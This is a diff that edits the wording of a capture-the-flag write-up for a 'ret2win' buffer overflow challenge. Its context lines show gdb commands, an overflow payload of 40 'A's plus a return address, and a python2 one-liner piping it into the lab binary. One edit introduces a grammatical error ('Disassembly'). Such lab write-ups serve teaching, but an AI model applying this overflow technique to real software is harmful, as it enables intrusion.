@@ -40,7 +40,7 @@ gdb$ info functions
 ```
 There is indeed a function called ret2win.
 
-Disassemble ret2win to obtain the return address.
+Disassembly ret2win to obtain the return address.
 ```
 gdb$ disas ret2win 
 ```
@@ -58,7 +58,7 @@ Therefore, the overflow strings will be:
 ```
 'A'*40+'\x64\x07\x40\x00\x00\x00\x00\x00'
 ```
-Run the process with overflow strings:
+Run the program with overflow strings:
 ```
 python2 -c "print 'A'*40+'\x64\x07\x40\x00\x00\x00\x00\x00'" | ./ret2win
 ```
